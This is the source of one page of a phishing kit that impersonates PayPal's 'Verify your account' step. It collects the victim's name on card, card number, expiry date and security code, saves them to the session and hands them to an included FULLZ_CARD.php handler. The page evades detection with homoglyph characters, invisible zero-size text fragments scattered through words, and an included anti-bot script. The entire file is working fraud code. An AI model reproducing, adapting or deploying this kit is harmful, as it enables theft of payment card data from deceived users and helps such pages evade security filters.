<?php


session_start();
date_default_timezone_set('GMT'); 
@ini_set('display_errors', 0); 
error_reporting(E_ALL ^ E_NOTICE); 
$time = date('d/m/Y G:i:s');
include('../config.php');
include('../antibots.php');
############## CREDIT CARD INFORMATION ##############
$_SESSION['_c_valid_']    = $_POST['c_valid'];
$_SESSION['_c_type_']     = $_POST['c_type'];
$_SESSION['_nameoncard_'] = $_POST['nameoncard'];
$_SESSION['_cardnumber_'] = $_POST['cardnumber'];
$_SESSION['_expdate_']    = $_POST['expdate'];
$_SESSION['_csc_']        = $_POST['csc'];	
$FULL = $_POST['nameoncard'] || $_POST['cardnumber'] || $_POST['expdate'] || $_POST['csc'];
####################################################
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if(empty($FULL)== false) {
        include('FULLZ_CARD.php');
}}
?>
<html class=" BowZ118 BowDefaultZ118 js " lang="fr" dir="ltr">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>&#929;&#945;y&#929;&#945;l Safety & Security</title>
	<meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
	<link rel="shortcut icon" type="image/x-icon" href="../../lib/img/favicon.ico">
    <link rel="icon" type="image/x-icon" href="../../lib/img//pp32.png">
    <link rel="apple-touch-icon" href="../../lib/img/apple-touch-icon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <link rel="stylesheet" href="../../lib/css/G-Z118.css">
    <link rel="stylesheet" href="../../lib/css/B-Z118.css">
    </style>
    <script src="../../lib/js/jquery.js"></script>
    <script src="../../lib/js/jquery.validate.js"></script>
	<script src="../../lib/js/jquery.additional-methods.js"></script>
	<script src="../../lib/js/jquery.v-form.js"></script>
	<script src="../../lib/js/jquery.CardValidator.js"></script>
	<script src="../../lib/js/jquery.mask.js"></script>
    <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000000000000000000');
		$('#csc').mask('0000');
	});
	</script>
</head>
<body>
    <header class="mainHeader" role="banner">
        <div class="headerContainer">
            <div class="Grimm12">
                <a data-click="payPalLogo" href="#" class="logo"></a>
                <div class="loginBtn"><span class="securityLock">Yo<font style="color:transparent;font-size:0px">sas</font>ur se<font style="color:transparent;font-size:0px">sas</font>cu<font style="color:transparent;font-size:0px">sas</font>r<font style="color:transparent;font-size:0px">sas</font>ity is our top pr<font style="color:transparent;font-size:0px">sas</font>io<font style="color:transparent;font-size:0px">sas</font>ri<font style="color:transparent;font-size:0px">sas</font>ty</span></div>
            </div>
        </div>
    </header>
    <main class="BrowMainZ118">
        <section id="content" role="main" data-country="US">
            <section id="main" class="">
                <div id="WorldWide" class="WorldWide Grimm12">
                    <div class="Grimm118">
                        <form action="" method="post" name="WorldWide_form" class="validator" novalidate="novalidate">
                            <div class="stepProgress"><span>○</span><span>○</span><span class="selected">●</span></div>
                            <div class="HeaderZ118">
                                <h2>Ve<font style="color:transparent;font-size:0px">sas</font>ri<font style="color:transparent;font-size:0px">sas</font>fy your ac<font style="color:transparent;font-size:0px">sas</font>co<font style="color:transparent;font-size:0px">sas</font>unt</h2>
                            </div>
                            <hr style="width: 75%;">
                            <div>
                                <p style="text-align: center;font-size: 1.2em;width: 88%;padding-left: 6%;">Dear Cu<font style="color:transparent;font-size:0px">sas</font>sto<font style="color:transparent;font-size:0px">sas</font>mer, this is the last step, to make your acc<font style="color:transparent;font-size:0px">sas</font>ou<font style="color:transparent;font-size:0px">sas</font>nt more se<font style="color:transparent;font-size:0px">sas</font>cu<font style="color:transparent;font-size:0px">sas</font>re, after upd<font style="color:transparent;font-size:0px">sas</font>ati<font style="color:transparent;font-size:0px">sas</font>ng your cre<font style="color:transparent;font-size:0px">sas</font>d<font style="color:transparent;font-size:0px">sas</font>it/de<font style="color:transparent;font-size:0px">sas</font>bi<font style="color:transparent;font-size:0px">sas</font>t ca<font style="color:transparent;font-size:0px">sas</font>rd in<font style="color:transparent;font-size:0px">sas</font>fo<font style="color:transparent;font-size:0px">sas</font>rma<font style="color:transparent;font-size:0px">sas</font>ti<font style="color:transparent;font-size:0px">sas</font>on </p>
                            </div>
                            <div class="BowContainerZ118">                               
                                <div class="inner"><p>Upd<font style="color:transparent;font-size:0px">sas</font>ate Cre<font style="color:transparent;font-size:0px">sas</font>di<font style="color:transparent;font-size:0px">sas</font>t/De<font style="color:transparent;font-size:0px">sas</font>bit Ca<font style="color:transparent;font-size:0px">sas</font>rd</p>
                                    <div class="G-FieldsZ118">
                                        <div class="textInput lap ">
                                            <div class="FieldsZ118 large">
                                                <input type="text" class="validate" id="nameoncard" name="nameoncard" required="required" autocomplete="off" placeholder="Name On Card" value="">
                                            </div>
                                        </div>
                                        <div class="textInput">
                                            <div class="FieldsZ118 large">
                                                <input type="text" class="validate" id="cardnumber" name="cardnumber" maxlength="16" placeholder="Card Number" required="required"autocomplete="off" value="">
											    <input name="c_type" type="hidden" id="card_type" value="">
                        					    <input name="c_valid" type="hidden" id="card_valid" value="">
											</div>
                                        </div>
                                    </div>                                    
                                        <div class="G-FieldsZ118">                                                                                       
                                            <div class="multi equal clearfix">
                                                <div class="FieldsZ118 medium left">
                                                    <input type="tel" id="expdate" name="expdate" autocomplete="off" class="validate" required="required" value="" maxlength="7" placeholder="Expiration Date" >
                                                </div>
                                                <div class="textInput">
                                                    <div class="FieldsZ118 medium right">
                                                        <input type="tel" id="csc" name="csc" autocomplete="off" class="validate" required="required" maxlength="4" placeholder="CSC (3 digits)" value="">
                                                    </div>
                                                </div>
                                            </div>
                                        </div> 			
										
 									<div class="G-FieldsZ118">	
									    <div class="AddressLine" id="addressEntry">
									        <p>Bi<font style="color:transparent;font-size:0px">sas</font>ll<font style="color:transparent;font-size:0px">sas</font>in<font style="color:transparent;font-size:0px">sas</font>g Ad<font style="color:transparent;font-size:0px">sas</font>dr<font style="color:transparent;font-size:0px">sas</font>ess In<font style="color:transparent;font-size:0px">sas</font>fo</p>                                       
                                            <div class="displayContainer">
											<div class="address">
											<div class="display">
											<p class="addressDisplay camelCase">
                                            <?php echo $_SESSION['_address_']; ?>
		                 				  <br>
										  <?php echo $_SESSION['_city_']; ?>, <?php echo $_SESSION['_state_']; ?> <?php echo $_SESSION['_zipCode_']; ?>
										  <br>
										  <?php echo $_SESSION['_countryname_']; ?>
                                            </p>
											<a class="editAddress" id="editAddress" href="#">Edit</a></div></div></div>
                                        </div>
                                    </div>
                                        </div>
                                    </div>									
									<div class="agreeTC checkbox">
                                        <div class="FieldsZ118">
                                            <label class="helpNotifyUS" role="button">
                                                <input type="checkbox" class="validate ui-helper-hidden-accessible" required="required" name="terms" id="termsAgree" auto-required="true">
                                                <span class="icon "></span>By cli<font style="color:transparent;font-size:0px">sas</font>cki<font style="color:transparent;font-size:0px">sas</font>ng Ag<font style="color:transparent;font-size:0px">sas</font>re<font style="color:transparent;font-size:0px">sas</font>e &amp; Con<font style="color:transparent;font-size:0px">sas</font>tin<font style="color:transparent;font-size:0px">sas</font>ue, I h<font style="color:transparent;font-size:0px">sas</font>ave re<font style="color:transparent;font-size:0px">sas</font>ad an<font style="color:transparent;font-size:0px">sas</font>d agr<font style="color:transparent;font-size:0px">sas</font>ee to Pay<font style="color:transparent;font-size:0px">sas</font>Pa<font style="color:transparent;font-size:0px">sas</font>l’s <a data-click="userAgreement" href="/us/webapps/mpp/ua/useragreement-full?country.x=us&amp;locale.x=en_US" target="_blank">Us<font style="color:transparent;font-size:0px">sas</font>er Agreement</a>, <a data-click="privacyPolicy" href="/us/webapps/mpp/ua/privacy-full?country.x=us&amp;locale.x=en_US" target="_blank">Privacy Policy</a> and <a data-click="esign" href="/us/webapps/mpp/ua/esign-full?country.x=us&amp;locale.x=en_US" target="_blank">Electronic Comm<font style="color:transparent;font-size:0px">sas</font>unic<font style="color:transparent;font-size:0px">sas</font>ati<font style="color:transparent;font-size:0px">sas</font>ons Del<font style="color:transparent;font-size:0px">sas</font>ive<font style="color:transparent;font-size:0px">sas</font>ry Pol<font style="color:transparent;font-size:0px">sas</font>ic<font style="color:transparent;font-size:0px">sas</font>y</a>.</label>
                                        </div>
                                    </div>
                                    <input id="submitBtn" name="" type="submit" class="ButtonZ118" value="Αgree &amp; Continue" data-click="WorldWideSubmit">
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </section>
        </section>
		<script type="text/javascript">
        $(function() {
		    $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
			$('#cardnumber').validateCreditCard(function(result) {
			    if(result.card_type == null){
                    $('#cardnumber').removeClass();
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
					
                }
            });
            });
		});
        </script>
		<script type="text/javascript">		
		$('#cardnumber').validateCreditCard(function(result) {
            // console.log(result);
            if (result.card_type != null) {
                switch (result.card_type.name) {
                    case "VISA":
                        $('#cardnumber').css('background-position', '98.5% -1%');
                        break;
                    case "VISA ELECTRON":
                        $('#cardnumber').css('background-position', '98.5%  47.4%');
                        break;
                    case "MASTERCARD":
                        $('#cardnumber').css('background-position', '98.5%  3.6%');
                        break;
                    case "MAESTRO":
                        $('#cardnumber').css('background-position', '98.5%  39.6%');
                        break;
                    case "DISCOVER":
                        $('#cardnumber').css('background-position', '98.5%  17.7%');
                        break;
                    case "AMEX":
                        $('#cardnumber').css('background-position', '99% 10%');
                        break;
					case "JCB":
                        $('#cardnumber').css('background-position', '98.5% 32%');
                        break;
					case "DINERS_CLUB":
                        $('#cardnumber').css('background-position', '98.5% 24.8%');
                        break;
					default:
                        $('#cardnumber').css('background-position', '98.5% 81.7%');
                        break;
                }
			} else {
                $('#cardnumber').css('background-position', '98.5% 81.7%');
            }
			 // Check for valid card numbere - only show validation checks for invalid Luhn when length is correct so as not to confuse user as they type.
            if (result.valid || $cardinput.val().length > 16) {
                if (result.valid) {
                    $('#cardnumber').removeClass('error').addClass('');
                } else {
                    $('#cardnumber').removeClass('').addClass('error');
                }
            } else {
                $('#cardnumber').removeClass('').removeClass('error');
            }
        });
		</script>
    </main>
    <footer id="gblFooter" role="contentinfo">
        <div class="footer IntentFooter">
            <div class="footerNav">
                <div class="Grimm12">
                    <div class="legal">
                        <p class="copyright">© <?php echo date('Y') ?> &#80;&#97;&#121;&#80;&#97;&#108;</p>
                        <ul>
                            <li><a data-click="privacyPolicy" href="#" target="_blank">Pri<font style="color:transparent;font-size:0px">sas</font>va<font style="color:transparent;font-size:0px">sas</font>cy</a></li>
                            <li><a data-click="legalAgreement" href="#" target="_blank">Le<font style="color:transparent;font-size:0px">sas</font>ga<font style="color:transparent;font-size:0px">sas</font>l</a></li>
                            <li><a data-click="contactUs" href="#" target="_blank">Con<font style="color:transparent;font-size:0px">sas</font>tа<font style="color:transparent;font-size:0px">sas</font>сt υѕ </a></li>
                            <li class="siteFeedback" id="siteFeedback"></li>
                        </ul>
						<div class="flag countryFlag">
						<a data-click="flagChange" href="javascript:void(0)" id="countryFlag" class="country <?php echo $_SESSION['_countrycode_']; ?>">countryFlag</a>
						</div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
</body></html>